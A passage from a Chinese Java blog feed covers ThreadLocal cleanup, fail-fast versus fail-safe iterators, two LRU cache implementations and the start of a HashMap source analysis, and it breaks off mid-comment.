&#125;</span><br></pre></td></tr></table></figure><p>通过表格来说明一下，如下：</p><table><thead><tr><th>引用类型</th><th>被垃圾回收时间</th><th>用途</th></tr></thead><tbody><tr><td>强引用</td><td>从来不会</td><td>对象的一般状态</td></tr><tr><td>软引用</td><td>当内存不足时</td><td>对象缓存</td></tr><tr><td>弱引用</td><td>正常垃圾回收时</td><td>对象缓存</td></tr><tr><td>虚引用</td><td>正常垃圾回收时</td><td>跟踪对象的垃圾回收</td></tr></tbody></table><p><a href="https://juejin.im/post/5b82c02df265da436152f5ad#heading-5" target="_blank" rel="noopener">理解Java的强引用、软引用、弱引用和虚引用</a></p><h2 id="清理时机"><a href="#清理时机" class="headerlink" title="清理时机"></a>清理时机</h2><p>线程退出时，会做一个清理工作，其中就包括清理ThreadLocalMap，即把threadLocals=null。</p><p>而然使用线程池会对线程进行<strong>复用</strong>，就意味当前线程未必会退出，可能会出现内存泄露，<strong>即你不用这个对象了，但它无法被回收。因此最好每次使ThreadLocal.remove()方法将这个变量移除。</strong></p><blockquote><p>参考</p><p>《Java高并发程序设计》</p><p><a href="https://blog.csdn.net/u012104435/article/details/47951357" target="_blank" rel="noopener">解决Hash冲突的几种方法</a></p><p><a href="https://www.jianshu.com/p/d3e1282ba7ca" target="_blank" rel="noopener">ThreadLocal和弱引用</a></p></blockquote><p>​     </p>]]></content>
      
      
      <categories>
          
          <category> 并发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Fast-fail与Fast-safe</title>
      <link href="/2019/08/01/Fast-fail%E4%B8%8EFast-safe/"/>
      <url>/2019/08/01/Fast-fail%E4%B8%8EFast-safe/</url>
      
        <content type="html"><![CDATA[<h2 id="Fast-fail"><a href="#Fast-fail" class="headerlink" title="Fast-fail"></a>Fast-fail</h2><h4 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h4><p><strong>fail-fast,即快速失败机制，它是java集合中的一种错误检测机制，当多个线程或者单个线程,在结构上对集合进行改变时，就有可能会产生fail-fast机制。</strong></p><p><em>注意：结构上的改变的意思是，例如集合上的<strong>插入和删除</strong>就是结构上的改变，但是，如果是对集合中某个元素进行<strong>修改</strong>的话，并不是结构上的改变。</em> </p><h4 id="为什么"><a href="#为什么" class="headerlink" title="为什么"></a>为什么</h4><p>为什么要有快速失败？为什么用for(int i=0;i&lt;list.size();i++)这种形式就能一边遍历一边修改集合？</p><p>其实答案很简单，普通for循环时，当一个元素结结构被改变时，集合大小和下标也会随之变化，<strong>size是可以随着你改变变换的</strong>。</p><p>但使用了迭代器就不行了。迭代器（Iterator）是工作在一个独立的线程中，并且拥有一个 mutex 锁。 迭代器被创建之后会建立一个指向原来对象的单链索引表，当原来的对象数量发生变化时，<strong>这个索引表的内容不会同步改变</strong>，所以当索引指针往后移动的时候就找不到要迭代的对象，所以按照 fail-fast 原则 迭代器会马上抛出 java.util.ConcurrentModificationException。</p><p>最后说一嘴，如果非要在用迭代器的时候删除，可以用迭代器的remove方法。如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (s.equals(<span class="string">"a"</span>)) &#123;</span><br><span class="line">      iter.remove();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>迭代器在执行next()等方法的时候，都会调用<strong>checkForComodification()</strong>这个方法，查看modCount==expectedModCount如果不相等则抛出异常。</p><p>expectedModcount:这个值在对象被创建的时候就被赋予了一个固定的值modCount。也就是说这个值是不变的。也就是说，如果在迭代器遍历元素的时候，如果modCount这个值发生了改变，那么再次遍历时就会抛出异常。 </p><p>什么时候modCount会发生改变呢？就是对集合的元素的个数做出改变的时候，modCount的值就会被改变，如果删除，插入。但修改则不会。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Itr</span> <span class="keyword">implements</span> <span class="title">Iterator</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">int</span> expectedModCount = modCount;</span><br><span class="line">        </span><br><span class="line">         <span class="function"><span class="keyword">public</span> E <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            checkForComodification();</span><br><span class="line">            ...省略...</span><br><span class="line">       &#125;</span><br><span class="line">            <span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">checkForComodification</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (modCount != expectedModCount)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Fast-safe"><a href="#Fast-safe" class="headerlink" title="Fast-safe"></a>Fast-safe</h2><h3 id="是什么-1"><a href="#是什么-1" class="headerlink" title="是什么"></a>是什么</h3><p>采用安全失败机制的集合容器，在遍历时不是直接在集合内容上访问的，而是<strong>先复制原有集合内容</strong>，在拷贝的集合上进行遍历。主要是为了在多线程下可以并发的对集合进行更改。</p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>由于迭代时是对原集合的拷贝进行遍历，所以在遍历过程中对原集合所作的修改并不能被迭代器检测到，所以不会触发Concurrent Modification Exception。</p><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>基于拷贝内容的优点是避免了Concurrent Modification Exception，但同样地，<strong>迭代器并不能访问到修改后的内容</strong>，即迭代器遍历的是开始遍历那一刻拿到的集合拷贝，在遍历期间原集合发生的修改迭代器是不知道的。</p><h2 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h2><p>Fast-fail场景：java.util包下的集合类都是快速失败的，不能在多线程下发生并发修改（迭代过程中被修改）。</p><p>Fast-fail场景：java.util.concurrent包下的容器都是安全失败，可以在多线程下并发使用，并发修改。</p><blockquote><p><a href="https://blog.csdn.net/mlym521/article/details/82465126" target="_blank" rel="noopener">fail_fast和fail_safe的介绍及区别</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>用java实现一个LRU</title>
      <link href="/2019/07/25/LRU/"/>
      <url>/2019/07/25/LRU/</url>
      
        <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>Least Recently Used(LRU)，即最近最少使用页面置换算法。<strong>选择最长时间没有被引用的页面进行置换</strong>，思想是：如果一个页面很久没有被引用到，那么可以认为在将来该页面也很少被访问到。</p><p>在操作系统中的应用：当发生缺页（CPU要访问的页不在内存中），计算内存中每个页上一次被访问的时间，置换上次使用到当前时间最长的一个页面。</p><p>使用java可以有两种实现方式。</p><h1 id="第一种：双向链表-哈希表"><a href="#第一种：双向链表-哈希表" class="headerlink" title="第一种：双向链表+哈希表"></a>第一种：双向链表+哈希表</h1><p>可以使用<strong>双向链表+哈希表</strong>的方式。<strong>HashMap主要是为了判断是否命中缓存。LinkedList用于维护一个按最近一次访问时间排序的页面链表。</strong>链表头结点是最近刚刚访问过的页面，链表尾结点是最久未被访问的页面。访问内存时，若命中缓存，找到响应的页面，将其移动到链表头部，表示该页面是最近刚刚访问的。缺页时，将链表尾部的页面移除，同时新页面放到链表头。</p><p>该类有四个方法：</p><ul><li>moveToFirst()：把该元素移动链表的头部</li><li>removeLast()：把链表尾部元素删除。</li><li>get()：同步获取元素,map未命中，返回null。map命中则获取，并调用moveToFirst。</li><li>put()：同步放入元素。如果map未命中，如果链表长度已经超过缓存的大小，移除链表尾部的元素，把元素放入链表的头部和map里。如果map命中，则moveToFirst把该元素移到链表的头。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span>&lt;<span class="title">K</span>, <span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        LRUCache&lt;String,String&gt; lru=<span class="keyword">new</span> LRUCache&lt;&gt;(<span class="number">10</span>);</span><br><span class="line">        lru.put(<span class="string">"C"</span>, <span class="keyword">null</span>);</span><br><span class="line">        lru.put(<span class="string">"A"</span>, <span class="keyword">null</span>);</span><br><span class="line">        lru.put(<span class="string">"D"</span>, <span class="keyword">null</span>);</span><br><span class="line">        lru.put(<span class="string">"B"</span>, <span class="keyword">null</span>);</span><br><span class="line">        lru.put(<span class="string">"E"</span>, <span class="keyword">null</span>);</span><br><span class="line">        lru.put(<span class="string">"B"</span>, <span class="keyword">null</span>);</span><br><span class="line">        lru.put(<span class="string">"A"</span>, <span class="keyword">null</span>);</span><br><span class="line">        lru.put(<span class="string">"B"</span>, <span class="keyword">null</span>);</span><br><span class="line">        lru.put(<span class="string">"C"</span>, <span class="keyword">null</span>);</span><br><span class="line">        lru.put(<span class="string">"D"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(lru);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        out:[D, C, B, A, E]</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//缓存大小，put时候需判断有没超过缓存大小</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> cacheSize;</span><br><span class="line">    <span class="comment">//用散列表判断是否命中缓存。</span></span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;K, V&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="comment">//用链表维护最近一次访问时间排序的页面链表</span></span><br><span class="line">    <span class="keyword">private</span> LinkedList&lt;K&gt; linkCache = <span class="keyword">new</span> LinkedList();</span><br><span class="line"></span><br><span class="line">    LRUCache(<span class="keyword">int</span> cacheSize) &#123;</span><br><span class="line">        <span class="keyword">this</span>.cacheSize = cacheSize;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">removeLast</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        linkCache.removeLast();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//用syn保证线程安全</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(K key, V val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!map.containsKey(key)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.size() &gt;= cacheSize) &#123;</span><br><span class="line">                removeLast();</span><br><span class="line">            &#125;</span><br><span class="line">            map.put(key, val);</span><br><span class="line">            linkCache.addFirst(key);<span class="comment">//put加到链表头</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            moveToFirst(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> V <span class="title">get</span><span class="params">(K key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!map.containsKey(key)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        moveToFirst(key);</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">moveToFirst</span><span class="params">(K key)</span> </span>&#123;</span><br><span class="line">        linkCache.remove(key);</span><br><span class="line">        linkCache.addFirst(key);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> linkCache.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第二种：LinkedHashMap"><a href="#第二种：LinkedHashMap" class="headerlink" title="第二种：LinkedHashMap"></a>第二种：LinkedHashMap</h1><p>JDK其实已经实现了一种顺序存储的HashMap，我们可以直接使用。代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> other;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>:</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: wangxuanni</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2019-08-13 23:40</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LRU3</span>&lt;<span class="title">K</span>, <span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        LRU3&lt;String, Integer&gt; lru3 = <span class="keyword">new</span> LRU3&lt;&gt;(<span class="number">3</span>);</span><br><span class="line">        lru3.put(<span class="string">"A"</span>, <span class="number">1</span>);</span><br><span class="line">        lru3.put(<span class="string">"B"</span>, <span class="number">2</span>);</span><br><span class="line">        lru3.put(<span class="string">"C"</span>, <span class="number">3</span>);</span><br><span class="line">        lru3.put(<span class="string">"D"</span>, <span class="number">4</span>);</span><br><span class="line">        lru3.put(<span class="string">"A"</span>, <span class="number">1</span>);</span><br><span class="line">        lru3.put(<span class="string">"B"</span>, <span class="number">2</span>);</span><br><span class="line">        lru3.print();</span><br><span class="line">        <span class="comment">//out：D--A--B--</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">float</span> hashLoadFactory = <span class="number">0.75f</span>;</span><br><span class="line">    <span class="keyword">private</span> LinkedHashMap&lt;K, V&gt; map;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> cacheSize;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LRU3</span><span class="params">(<span class="keyword">int</span> cacheSize)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cacheSize = cacheSize;</span><br><span class="line">        <span class="keyword">int</span> capacity = (<span class="keyword">int</span>) Math.ceil(cacheSize / hashLoadFactory) + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 最后一个参数true 表示按访问顺序来进行排序</span></span><br><span class="line">        map = <span class="keyword">new</span> LinkedHashMap&lt;K, V&gt;(capacity, hashLoadFactory, <span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1</span>;</span><br><span class="line">       <span class="comment">// 当 map中的数据量大于cacheSize的时候，就自动删除最老的数据。</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">removeEldestEntry</span><span class="params">(Map.Entry eldest)</span></span>&#123;</span><br><span class="line">                <span class="keyword">return</span> size() &gt; LRU3.<span class="keyword">this</span>.cacheSize;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">        map.put(key, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;K, V&gt; entry : map.entrySet()) &#123;</span><br><span class="line">            System.out.print(entry.getKey() + <span class="string">"--"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LinkedHashMap原理"><a href="#LinkedHashMap原理" class="headerlink" title="LinkedHashMap原理"></a>LinkedHashMap原理</h2><p>LinkedHashMap继承了HashMap，作为HashMap的亲儿子，它们有很多相似的地方。</p><h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">LinkedHashMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 调用HashMap的构造方法，其实就是初始化Entry[] table</span></span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    <span class="comment">// 这里是指是否基于访问排序，默认为false</span></span><br><span class="line">    accessOrder = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个重要的成员变量accessOrder。因LinkedHashMap存储数据是有序的，而且分为两种：插入顺序和访问顺序。accessOrder则表示是否按访问顺序存储。这里设置为<strong>false</strong>，表示是<strong>插入顺序存储的</strong>，这也是默认值。</p><p>在上面代码中，构造函数的最后一个参数就是把accessOrder设置为<strong>true</strong>，表示按访问顺序排序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map = <span class="keyword">new</span> LinkedHashMap&lt;K, V&gt;(capacity, hashLoadFactory, <span class="keyword">true</span>)</span><br></pre></td></tr></table></figure><h3 id="Entry"><a href="#Entry" class="headerlink" title="Entry"></a>Entry</h3><p>LinkedHashMap与HashMap最大的不同在于它的Entry有<strong>前后指针—</strong>— Entry&lt;K,V&gt; before, after</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * LinkedHashMap entry.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Entry</span>&lt;K,V&gt; <span class="title">extends</span> <span class="title">HashMap</span>.<span class="title">Entry</span>&lt;K,V&gt; &#123;</span></span><br><span class="line">    <span class="comment">// These fields comprise the doubly linked list used for iteration.</span></span><br><span class="line">    Entry&lt;K,V&gt; before, after;</span><br><span class="line"></span><br><span class="line">    Entry(<span class="keyword">int</span> hash, K key, V value, HashMap.Entry&lt;K,V&gt; next) &#123;</span><br><span class="line">        super(hash, key, value, next);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>此外，在初始化的时候除了初始化了一个Entry[] table，还会额外初始化一个hash=-1，key、value、next都为null的<strong>只有头结点的双向链表</strong>，如图</p><p><img src="https://upload-images.jianshu.io/upload_images/4843132-cac0b65e4d23b6bd.png?imageMogr2/auto-orient/strip|imageView2/2/w/524/format/webp" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建了一个hash=-1，key、value、next都为null的Entry</span></span><br><span class="line">        header = <span class="keyword">new</span> Entry&lt;&gt;(-<span class="number">1</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">// 让创建的Entry的before和after都指向自身，注意after不是之前提到的next</span></span><br><span class="line">        <span class="comment">// 其实就是创建了一个只有头部节点的双向链表</span></span><br><span class="line">        header.before = header.after = header;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="put元素"><a href="#put元素" class="headerlink" title="put元素"></a>put元素</h3><p>当put元素时，不但要把它加入到HashMap中去，还要加入到双向链表中。</p><p>首先是只加入一个元素Entry1，假设index为0：</p><p><img src="https://upload-images.jianshu.io/upload_images/4843132-d48bb58775418c95.png?imageMogr2/auto-orient/strip|imageView2/2/w/475/format/webp" alt="img"></p><p>LinkedHashMap结构一个元素.png</p><p>当再加入一个元素Entry2，假设index为15：</p><p><img src="https://upload-images.jianshu.io/upload_images/4843132-10c917166c1f4745.png?imageMogr2/auto-orient/strip|imageView2/2/w/525/format/webp" alt="img"></p><p>LinkedHashMap结构两个元素.png</p><h3 id="双向链表的重排序"><a href="#双向链表的重排序" class="headerlink" title="双向链表的重排序"></a>双向链表的重排序</h3><p>当key如果已经存在时，并且accessOrder为true，即是访问顺序模式，才会put时对更新的Entry进行重新排序，而如果是插入顺序模式时，不会重新排序，这里的排序跟在HashMap中存储没有关系，只是指在双向链表中的顺序。</p><p>举个栗子：开始时，HashMap中有Entry1、Entry2、Entry3，并设置LinkedHashMap为访问顺序，则更新Entry1时，会先把Entry1从双向链表中删除，然后再把Entry1加入到双向链表的表尾，而Entry1在HashMap结构中的存储位置没有变化。</p><p>最后，有一个面试问题是如何实现顺序存储的hashmap，看完这篇文章，可以轻松回答了：可以使用双向链表加哈希表，也可以参照LinkedHashMap实现原理。</p><blockquote><p><a href="https://www.jianshu.com/p/8f4f58b4b8ab" target="_blank" rel="noopener">图解LinkedHashMap原理，关于LinkedHashMap大部分原理都来自该博文</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HashMap深度探索</title>
      <link href="/2019/07/23/HashMap/"/>
      <url>/2019/07/23/HashMap/</url>
      
        <content type="html"><![CDATA[<p>HashMap是java使用频率最高的集合类之一。本文将从重要知识点、主要方法源码分析、与其他集合的比较三个方面来探索<strong>JDK1.8</strong>版本的HashMap。本文目录如下</p><p>[TOC]</p><h1 id="重要知识点"><a href="#重要知识点" class="headerlink" title="重要知识点"></a>重要知识点</h1><h2 id="继承关系"><a href="#继承关系" class="headerlink" title="继承关系"></a>继承关系</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;<span class="keyword">implements</span> <span class="title">Map</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;, <span class="title">Cloneable</span>, <span class="title">Serializable</span></span></span><br></pre></td></tr></table></figure><p>可以看到HashMap继承了AbstractMap实现了三个接口Map&lt;K,V&gt;, Cloneable, Serializable。我的理解是继承一个类是将HashMap<strong>分为map类</strong>，而实现接口是表明HashMap有可复制、可序列化的<strong>能力</strong>。</p><p><em>顺便说一句，不知道大家有没有想过为什么HashMap既然继承了AbstractMap为什么还要实现Map？并且AbstractMap也实现了Map？ 我看的时候好奇就去网上搜了搜，据java集合框架的创始人Josh Bloch描述，这样的写法其实是一个失误。在java集合框架中，类似这样的写法很多。最开始写java集合框架的时候，他认为这样写，在某些地方可能是有价值的，直到他意识到错了。显然的，JDK的维护者，后来不认为这个小小的失误值得去修改。所以就这样存在下来了。<a href="https://stackoverflow.com/questions/2165204/why-does-linkedhashsete-extend-hashsete-and-implement-sete" target="_blank" rel="noopener">stack overflow上的回答</a></em></p><h2 id="重要参数"><a href="#重要参数" class="headerlink" title="重要参数"></a>重要参数</h2><h3 id="静态常量"><a href="#静态常量" class="headerlink" title="静态常量"></a>静态常量</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始容量为2^4=16</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEFAULT_INITIAL_CAPACITY = <span class="number">1</span> &lt;&lt; <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最大容量=2^30,传入容量过大将被这个值替换</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAXIMUM_CAPACITY = <span class="number">1</span> &lt;&lt; <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 负载因子=0.75，当键值对个数达到&gt;=容量* 负载因子（0.75）会触发resize扩容 </span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">float</span> DEFAULT_LOAD_FACTOR = <span class="number">0.75f</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 树化的阀值=8，当链表长度大于8，且数组长度大于MIN_TREEIFY_CAPACITY，就会转为红黑树</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TREEIFY_THRESHOLD = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 非树化的阀值=6，当resize时候发现链表长度小于6时，从红黑树退化为链表</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> UNTREEIFY_THRESHOLD = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//最小的树化容量=64， 